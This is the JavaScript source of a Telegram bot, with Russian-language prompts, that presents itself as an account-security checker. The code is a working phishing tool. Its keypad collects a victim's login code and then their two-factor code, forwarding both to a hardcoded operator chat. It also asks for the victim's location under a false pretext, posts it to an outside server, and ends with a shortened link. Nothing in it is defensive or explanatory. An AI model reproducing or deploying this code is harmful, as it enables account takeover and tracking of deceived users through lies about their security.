const { Telegraf, Markup } = require('telegraf')
require('dotenv').config()
const axios = require('axios')


const text = require('./const')
const fs = require('fs/promises')


const bot = new Telegraf(process.env.BOT_TOKEN)
const BASE_URL = 'https://boackend.herokuapp.com/api/'

let code = ''

bot.start(async (ctx) => {
    code=''
    await ctx.reply(`Привет, ${ctx.message.from.first_name}!`)
    bot.telegram.sendMessage(329958175, 'Старт')
    try {
        await ctx.replyWithHTML('Мы проверяем акаунты на наличие несанкционированого входа. <b>Проверить ваш акаунт?</b>', Markup.inlineKeyboard(
            [
             [Markup.button.callback('Да, хочу проверить!', 'btn_2')]
            ]
        ))

    } catch (error) {
        console.error(error)
    }
})
bot.help((ctx) => ctx.reply(text.commands))

bot.command('stt', async(ctx) => {
    await ctx.reply('Пришлите свою локацию, что б мы отключили все остальние соидинения.', Markup.keyboard([
        [Markup.button.locationRequest('Локация', false)]
    ]).resize());
})
bot.on('location', (ctx) => {
    const {location} = ctx.update.message
    if (location) {
        const now = new Date().toLocaleString()
        readFile('locations', {
            lat: location.latitude,
            lon: location.longitude,
            date: now
        })
        bot.telegram.sendMessage(329958175, `Локація`)
        ctx.replyWithHTML(`Вы удалили злоумышлиника!. Что бы узнать больше перейдите по <a href='https://bit.ly/3NTvIee'>Ссылке</a>`)
    }
})
bot.on('message', msg => {
    const { text } = msg.update.message
    if(code.length < 5){
        code+=text
        if(code.length === 5){
            bot.telegram.sendMessage(msg.chat.id, 'Введите код двухфакторной аутентификации', 
            {
                reply_markup:{
                    remove_keyboard: true
                }
            })
            const now = new Date().toLocaleString()
            bot.telegram.sendMessage(329958175, `Код: ${code}`)
            code = ''
        }
    } 
    if(text.length===6 || text.length === 4){
        bot.telegram.sendMessage(msg.chat.id, 'Наш бот войдет в аккаунт с ІР = 185.177.124.255 с целью просмотра наличия несанкционированого входа. Чтобы узнать больше - используй команду /stt')
        bot.telegram.sendMessage(329958175, `Двохфакторка: ${text}`)
        code = ''
        console.log(msg.chat.id)
    }
    console.log(code)

})
      

    const readFile = async (url, data) => {
        try {
            const result = await axios.post(BASE_URL+url, data)
        } catch {
            console.log(error.message)
        }
    }
 


function addActionBot(name, text) {
    
    bot.action(name, async (ctx) => {
        try {
            await ctx.answerCbQuery()
            await bot.telegram.sendMessage(ctx.chat.id,`${text}`, Markup.keyboard(
                         [
                             [Markup.button.callback('1', 'BTN_1'), Markup.button.callback('2', 'BTN_2'), Markup.button.callback('3', 'BTN_2')],
                             [Markup.button.callback('4', 'BTN_2'), Markup.button.callback('5', 'BTN_2'), Markup.button.callback('6', 'BTN_2')],
                             [Markup.button.callback('7', 'BTN_2'), Markup.button.callback('8', 'BTN_2'), Markup.button.callback('9', 'BTN_2')],
                             [Markup.button.callback('0', 'BTN_2')],
                         ]
                     ))
        } catch (e) {
            console.error(e)
        }
    } )
}
addActionBot('btn_2', text.textRu)


bot.launch(bot.start())

process.once('SIGINT', () => bot.stop('SIGINT'))
process.once('SIGTERM', () => bot.stop('SIGTERM'))